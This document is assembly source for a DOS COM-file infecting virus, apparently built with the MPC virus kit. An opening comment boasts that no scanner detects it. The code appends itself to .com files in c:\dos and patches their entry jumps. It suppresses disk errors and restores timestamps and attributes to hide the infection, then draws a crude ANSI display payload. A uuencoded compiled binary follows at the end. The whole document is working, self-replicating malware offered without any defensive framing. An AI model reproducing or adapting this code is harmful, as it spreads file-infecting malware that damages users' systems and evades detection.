;  The reason I stuck this MPC virus in here was
;  to show that when the MPC091B is used to make
;  a simple non-resident virus with no encryption
;  routine, NOTHING finds it..... ALSO, notice the
;  notorious PENIS ROUTINE at the beginning...It works.

.model tiny                             ; Handy directive
.code                                   ; Virus code segment
          org    100h                   ; COM file starting IP

entry_point: db 0e9h,0,0                ; jmp startvirus

startvirus:    loop  startvirus         ; virus code starts here
          call next                     ; calculate delta offset
next:     pop  bp                       ; bp = IP next
          sub  bp,offset next           ; bp = delta offset

          lea  si,[bp+offset save3]
          mov  di,100h
          push di                       ; For later return
          movsw
          movsb

          mov  byte ptr [bp+numinfec],30 ; reset infection counter

          mov  ah,1Ah                   ; Set new DTA
          lea  dx,[bp+offset newDTA]    ; new DTA @ DS:DX
          int  21h

          mov  ah,47h                   ; Get current directory
          mov  dl,0                     ; Current drive
          lea  si,[bp+offset origdir]   ; DS:SI->buffer
          int  21h
          mov  byte ptr [bp+backslash],'\' ; Prepare for later CHDIR

          mov  ax,3524h                 ; Get int 24 handler
          int  21h                      ; to ES:BX
          mov  word ptr [bp+oldint24],bx; Save it
          mov  word ptr [bp+oldint24+2],es
          mov  ah,25h                   ; Set new int 24 handler
          lea  dx,[bp+offset int24]     ; DS:DX->new handler
          int  21h
          push cs                       ; Restore ES
          pop  es                       ; 'cuz it was changed

dir_scan:                               ; "dot dot" traversal
          lea  dx,[bp+offset com_mask]
          mov  ah,4eh                   ; find first file
          mov  cx,7                     ; any attribute
findfirstnext:
          int  21h                      ; DS:DX points to mask
          jc   done_infections          ; No mo files found

          xor  cx,cx                    ; Clear attributes
          call attributes               ; Set file attributes

          mov  ax,3d02h                 ; Open read/write
          int  21h
          xchg ax,bx

          mov  ah,3fh                   ; Read file to buffer
          lea  dx,[bp+offset buffer]    ; @ DS:DX
          mov  cx,1Ah                   ; 1Ah bytes
          int  21h

          mov  ax,4202h                 ; Go to end of file
          xor  cx,cx
          cwd
          int  21h

checkCOM:
          mov  ax,word ptr [bp+newDTA+35] ; Get tail of filename
          cmp  ax,'DN'                  ; Ends in ND? (commaND)
          jz   find_next

          mov  ax,word ptr [bp+newDTA+1Ah] ; Filesize in DTA
          mov  cx,word ptr [bp+buffer+1]; get jmp location
          add  cx,heap-startvirus+3     ; Adjust for virus size
          cmp  ax,cx                    ; Already infected?
          je   find_next
          jmp  infect_com
done_file:
          mov  ax,5701h                 ; Restore creation date/time
          mov  cx,word ptr [bp+newDTA+16h] ; time
          mov  dx,word ptr [bp+newDTA+18h] ; date
          int  21h

          mov  ah,3eh                   ; Close file
          int  21h

          mov  ch,0
          mov  cl,byte ptr [bp+newDTA+15h] ; Restore original
          call attributes               ; attributes

          cmp  byte ptr [bp+numinfec], 0; Enough infections?
          jnz  find_next
          jmp  done_infections

find_next:
          mov  ah,4fh                   ; find next file
          jmp  short findfirstnext
          mov  ah,3bh                   ; change directory
          lea  dx,[bp+offset dot_dot]   ; "cd .."
          int  21h
          jnc  dir_scan                 ; go back for mo!

done_infections:
         jmp   activate
exit_virus:
          mov  ax,2524h                 ; Restore int 24 handler
          lds  dx,[bp+offset oldint24]  ; to original
          int  21h
          push cs
          pop  ds
            
          mov  ah,3bh                   ; change directory
          lea  dx,[bp+offset origdir-1] ; original directory
          int  21h

          mov  ah,1ah                   ; restore DTA to default
          mov  dx,80h                   ; DTA in PSP
          int  21h
          retn                          ; 100h is on stack
save3     db 0cdh,20h,0                 ; First 3 bytes of COM file

activate:       jmp     start                   ; Conditions satisfied

start:
        jmp short loc_1
        db  90h
data_2      db  0
data_3      dw  28Ah
        db  2
data_4      dw  0
                db      'MSDOS5.0 Version Screen Save'
        db  1Ah
data_5      db  'Unsupported Video Mode', 0Dh, 0Ah
        db  '$'
        loc_1:
        mov ah,0Fh
        int 10h         ; Video display   ah=functn 0Fh
                        ;  get state, al=mode, bh=page
                        ;   ah=columns on screen
        mov bx,0B800h
        cmp al,2
        je  loc_2           ; Jump if equal
        cmp al,3
        je  loc_2           ; Jump if equal
        mov data_2,0
        mov bx,0B000h
        cmp al,7
        je  loc_2           ; Jump if equal
        mov dx,offset data_5    ; ('Unsupported Video Mode')
        mov ah,9
        int 21h         ; DOS Services  ah=function 09h
                        ;  display char string at ds:dx
        retn
loc_2:
        mov es,bx
        mov di,data_4
        mov si,offset data_6
        mov dx,3DAh
        mov bl,9
        mov cx,data_3
        cld             ; Clear direction
        xor ax,ax           ; Zero register

locloop_4:
        lodsb               ; String [si] to al
        cmp al,1Bh
        jne loc_5           ; Jump if not equal
        xor ah,80h
        jmp short loc_20
loc_5:
        cmp al,10h
        jae loc_8           ; Jump if above or =
        and ah,0F0h
        or  ah,al
        jmp short loc_20
loc_8:
        cmp al,18h
        je  loc_11          ; Jump if equal
        jnc loc_12          ; Jump if carry=0
        sub al,10h
        add al,al
        add al,al
        add al,al
        add al,al
        and ah,8Fh
        or  ah,al
        jmp short loc_20
loc_11:
        mov di,data_4
        add di,data_1e
        mov data_4,di
        jmp short loc_20
loc_12:
        mov bp,cx
        mov cx,1
        cmp al,19h
        jne loc_13          ; Jump if not equal
        lodsb               ; String [si] to al
        mov cl,al
        mov al,20h          ; ' '
        dec bp
        jmp short loc_14
loc_13:
        cmp al,1Ah
        jne loc_15          ; Jump if not equal
        lodsb               ; String [si] to al
        dec bp
        mov cl,al
        lodsb               ; String [si] to al
        dec bp
loc_14:
        inc cx
loc_15:
        cmp data_2,0
        je  loc_18          ; Jump if equal
        mov bh,al

locloop_16:
        in  al,dx           ; port 3DAh, CGA/EGA vid status
        rcr al,1            ; Rotate thru carry
        jc  locloop_16      ; Jump if carry Set
loc_17:
        in  al,dx           ; port 3DAh, CGA/EGA vid status
        and al,bl
        jnz loc_17          ; Jump if not zero
        mov al,bh
        stosw               ; Store ax to es:[di]
        loop    locloop_16      ; Loop if cx > 0

        jmp short loc_19
        loc_18:
        rep stosw           ; Rep when cx >0 Store ax to es:[di]
loc_19:
        mov cx,bp
loc_20:
        jcxz    loc_ret_21      ; Jump if cx=0
        loop    locloop_4       ; Loop if cx > 0


loc_ret_21:
        retn
data_6      db  9
        db   10h, 19h, 40h, 18h, 19h, 40h
        db   18h, 19h, 40h, 18h, 19h, 40h
        db   18h, 19h, 0Ch, 02h, 1Ah, 05h
        db  0DCh, 0Ah,0DCh,0DCh, 02h, 1Ah
        db   06h,0DCh, 07h,0DCh,0DCh, 0Fh
        db  0DCh, 07h, 1Ah, 0Dh,0DCh, 0Fh
        db  0DCh,0DCh, 07h,0DCh,0DCh,0DCh
        db   02h, 1Ah, 0Eh,0DCh, 18h, 19h
        db   0Ch, 1Ah, 03h,0DBh, 0Ah,0DBh
        db  0DBh, 02h, 1Ah, 08h,0DBh, 17h
        db   20h, 0Fh,0DBh, 19h, 08h, 02h
        db  0DDh, 19h, 03h, 0Fh,0DEh,0DBh
        db   19h, 03h, 02h, 10h, 1Ah, 0Ah
        db  0DBh, 12h, 20h, 0Ah,0DDh, 02h
        db   10h,0DBh,0DBh, 18h, 19h, 0Ch
        db  0DBh,0DBh, 0Ah,0DBh,0DBh, 02h
        db   1Ah, 0Ah,0DBh, 0Fh, 17h,0DBh
        db   19h, 09h, 02h,0DDh, 19h, 03h
        db   0Fh,0DBh, 19h, 04h, 02h, 10h
        db   1Ah, 0Ah,0DBh, 0Ah, 12h,0DEh
        db   02h, 10h,0DBh,0DBh,0DBh, 18h
        db   19h, 0Ch, 0Ah,0DBh,0DBh,0DBh
        db   02h, 1Ah, 0Ah,0DBh, 0Ah, 12h
        db  0DEh, 0Fh, 17h,0DBh, 19h, 08h
        db   02h,0DEh, 10h,0DBh, 17h, 19h
        db   02h, 0Fh,0DEh, 19h, 05h, 02h
        db   10h, 1Ah, 0Ah,0DBh, 0Ah, 12h
        db  0DDh, 20h, 02h, 10h,0DBh,0DBh
        db   18h, 19h, 0Ch, 0Ah,0DBh,0DBh
        db   02h, 1Ah, 0Bh,0DBh, 0Ah, 12h
        db  0DBh, 0Fh, 17h,0DDh, 02h,0DFh
        db  0DCh, 19h, 06h,0DEh, 10h,0DBh
        db   17h, 19h, 02h, 0Fh,0DDh, 19h
        db   02h, 02h,0DCh,0DFh, 20h, 10h
        db   1Ah, 09h,0DBh, 0Ah, 12h,0DBh
        db   20h, 02h, 10h,0DBh,0DBh,0DBh
        db   18h, 19h, 0Ch, 0Ah,0DBh, 02h
        db   1Ah, 0Ah,0DBh, 12h, 20h, 0Ah
        db  0DBh, 10h,0DBh, 17h, 19h, 02h
        db   02h, 10h,0DBh, 17h,0DCh, 19h
        db   04h, 10h,0DBh,0DBh, 17h,0DDh
        db   20h, 0Fh,0DEh, 20h, 20h, 02h
        db  0DCh, 10h,0DBh, 17h, 19h, 02h
        db   10h, 1Ah, 07h,0DBh, 12h, 20h
        db   0Ah,0DBh, 20h, 02h, 10h, 1Ah
        db   03h,0DBh, 18h, 19h, 0Ch, 1Ah
        db   0Bh,0DBh, 0Ah,0DBh,0DBh, 12h
        db   20h, 17h, 19h, 03h, 02h,0DFh
        db   10h,0DBh, 17h,0DCh, 19h, 02h
        db   12h, 20h, 0Ah,0DDh, 02h, 17h
        db  0DDh, 20h, 20h,0DCh, 10h,0DBh
        db   17h,0DFh, 19h, 03h, 10h, 1Ah
        db   07h,0DBh, 0Ah,0DBh, 12h, 20h
        db   02h, 10h, 1Ah, 04h,0DBh, 18h
        db   19h, 0Ch, 1Ah, 0Ah,0DBh, 0Ah
        db  0DBh, 12h,0DBh, 20h, 02h, 10h
        db  0DBh, 17h, 19h, 05h,0DFh, 10h
        db  0DBh, 12h, 20h, 17h,0DCh,0DEh
        db   0Ah, 12h,0DDh, 17h, 20h, 02h
        db  0DCh, 10h,0DBh, 17h,0DFh, 19h
        db   05h, 10h, 1Ah, 06h,0DBh, 0Ah
        db  0DBh, 02h, 1Ah, 06h,0DBh, 18h
        db   19h, 0Ch, 1Ah, 09h,0DBh, 0Ah
        db  0DBh,0DBh, 02h,0DBh, 12h, 20h
        db   10h,0DBh, 17h, 19h, 04h,0DCh
        db  0DCh, 20h,0DFh, 10h,0DBh, 0Ah
        db   12h, 5Ch, 20h, 2Fh, 02h, 17h
        db  0DFh, 20h, 20h,0DCh,0DCh, 19h
        db   03h, 10h, 1Ah, 05h,0DBh, 0Ah
        db  0DBh, 12h, 19h, 02h, 02h, 10h
        db   1Ah, 04h,0DBh, 18h, 19h, 0Ch
        db   1Ah, 07h,0DBh, 0Ah,0DBh,0DBh
        db  0DBh, 12h, 20h, 02h, 10h,0DBh
        db  0DBh,0DBh, 17h, 19h, 03h,0DFh
        db   20h, 20h,0DFh, 10h,0DBh, 12h
        db   20h, 0Ah, 2Fh, 02h, 10h,0DBh
        db   0Ah, 12h, 5Ch, 02h, 10h,0DBh
        db  0DBh, 17h,0DFh, 20h, 20h,0DFh
        db   19h, 02h, 10h, 1Ah, 04h,0DBh
        db   0Ah,0DBh, 02h,0DBh,0DBh, 12h
        db   20h, 10h, 1Ah, 05h,0DBh, 18h
        db   19h, 0Ch, 1Ah, 05h,0DBh, 0Ah
        db   1Ah, 03h,0DBh, 12h, 19h, 02h
        db   02h, 10h,0DBh,0DBh, 17h, 19h
        db   05h, 0Fh, 10h,0DBh, 17h, 19h
        db   02h, 02h,0DFh,0DDh,0DFh, 19h
        db   03h, 07h, 10h,0DBh, 17h, 19h
        db   03h, 02h, 10h, 1Ah, 03h,0DBh
        db   0Ah,0DBh, 02h,0DBh,0DBh, 12h
        db   20h, 10h, 1Ah, 06h,0DBh, 18h
        db   19h, 0Ch, 1Ah, 03h,0DBh, 0Ah
        db   1Ah, 03h,0DBh, 12h,0DBh, 20h
        db   02h, 10h, 1Ah, 04h,0DBh, 17h
        db   19h, 04h, 0Fh, 10h,0DBh,0DBh
        db   17h, 19h, 02h, 02h,0DEh, 19h
        db   03h, 07h, 10h,0DBh,0DBh,0DBh
        db   17h, 19h, 03h, 02h, 10h,0DBh
        db  0DBh, 0Ah,0DBh,0DBh, 02h,0DBh
        db  0DBh, 12h, 20h, 10h, 1Ah, 07h
        db  0DBh, 18h, 19h, 0Ch,0DBh,0DBh
        db   0Ah, 1Ah, 03h,0DBh, 12h,0DBh
        db  0DBh, 02h, 10h, 1Ah, 06h,0DBh
        db   07h,0DBh, 17h, 19h, 02h, 0Fh
        db   10h,0DBh,0DBh, 17h, 19h, 03h
        db   02h,0DEh, 19h, 03h, 07h, 10h
        db  0DBh,0DBh,0DBh, 17h, 20h, 20h
        db   0Fh,0DCh,0DCh, 0Ah, 10h,0DBh
        db  0DBh,0DBh, 02h, 1Ah, 0Bh,0DBh
        db   18h

          jmp  exit_virus

infect_com:                             ; ax = filesize
          mov  cx,3
          push cx
          sub  ax,cx
          lea  si,[bp+offset buffer]
          lea  di,[bp+offset save3]
          movsw
          movsb
          mov  byte ptr [si-3],0e9h
          mov  word ptr [si-2],ax
finishinfection:

          mov  ah,40h                   ; Concatenate virus
          lea  dx,[bp+offset startvirus]
          mov  cx,heap-startvirus       ; # bytes to write
          int  21h

          mov  ax,4200h                 ; Move file pointer
          xor  cx,cx                    ; to beginning of file
          cwd                           ; xor dx,dx
          int  21h

          mov  ah,40h                   ; Write to file
          lea  dx,[bp+offset buffer]    ; Write from buffer
          pop  cx                       ; cx bytes
          int  21h

          dec  byte ptr [bp+numinfec]   ; One mo infection
          jmp  done_file

attributes:
          mov  ax,4301h                 ; Set attributes to cx
          lea  dx,[bp+offset newDTA+30] ; filename in DTA
          int  21h
          ret

int24:                                  ; New int 24h (error) handler
          mov  al,3                     ; Fail call
          iret                          ; Return control

data_1e     equ 0A0h
com_mask  db 'c:\dos\*.com',0
dot_dot   db '\',0
heap:                                   ; Variables not in code
oldint24  dd ?                          ; Storage for old int 24h handler
backslash db ?
origdir   db 64 dup (?)                 ; Current directory buffer
newDTA    db 43 dup (?)                 ; Temporary DTA
numinfec  db ?                          ; Infections this run
buffer    db 1ah dup (?)                ; read buffer
endheap:                                ; End of virus
end       entry_point

begin 775 aristotl.com
MZ0``XO[H``!=@>T(`8VVX0&_``%7I:3&ABH&'K0:C9;_!R`(VVOP7-
M(<:&O@5-EJL%M$ZY!P#-(7)L,\GH
M0@2X`CW-(9.T/XV6*P:Y&@#-(;@"0C/)F<&S2&T/LTAM0"*CA0&Z/,#@+XJ!@!U`^L/
MD+1/ZYJT.XV6N`7-(7.'ZQ^0N"0EQ9:Z!<'!O<..PXL^[@&^UP*ZV@.S"8L.ZP'\,\"L/!MU!8#T@.MJ
M/!!S!X#D\`K@ZU\\&'03LZB^FY`0`\&74(K(K(L"!-ZPH\&G4'K$V*R*Q-08`^Z@$`=!.*^.S0V'+[
M["+#=?N*QZOB\>L"\ZN+S>,"XHC#"1`90!@90!@90!@90!@9#`(:!=P*W-P"
M&@;<#]P'&@W<#]SVQD#`A`:"ML2(`K=`A#;VQ@9#-O;"MO;`AH*VP\7VQD)`MT9`P_;&00"
M$!H*VPH2W@(0V]O;&!D,"MO;VP(:"ML*$MX/%]L9"`+>$-L7&0(/WAD%`A`:
M"ML*$MT@`A#;VQ@9#`K;VP(:"]L*$ML/%]T"W]P9!MX0VQ<9`@_=&0("W-\@
M$!H)VPH2VR`"$-O;VQ@9#`K;`AH*VQ(@"ML0VQ<9`@(0VQ?<&000V]L7W2`/
MWB`@`MP0VQ<9`A`:!]L2(`K;(`(0&@/;&!D,&@O;"MO;$B`7&0,"WQ#;%]P9
M`A(@"MT"%]T@(-P0VQ??&0,0&@?;"ML2(`(0&@3;&!D,&@K;"ML2VR`"$-L7
M&07?$-L2(!?<@`MP0VQ??&040&@;;"ML"&@;;&!D,&@G;"MO;`ML2
M(!#;%QD$W-P@WQ#;"A)<("\"%]\@(-S<&0,0&@7;"ML2&0("$!H$VQ@9#!H'
MVPK;V]L2(`(0V]O;%QD#WR`@WQ#;$B`*+P(0VPH27`(0V]L7WR`@WQD"$!H$
MVPK;`MO;$B`0&@7;&!D,&@7;"AH#VQ(9`@(0V]L7&04/$-L7&0("W]W?&0,'
M$-L7&0,"$!H#VPK;`MO;$B`0&@;;&!D,&@/;"AH#VQ+;(`(0&@3;%QD$#Q#;
MVQ<9`@+>&0,'$-O;VQ<9`P(0V]L*V]L"V]L2(!`:!]L8&0S;VPH:`]L2V]L"
M$!H&VP?;%QD"#Q#;VQ<9`P+>&0,'$-O;VQ<@(`_
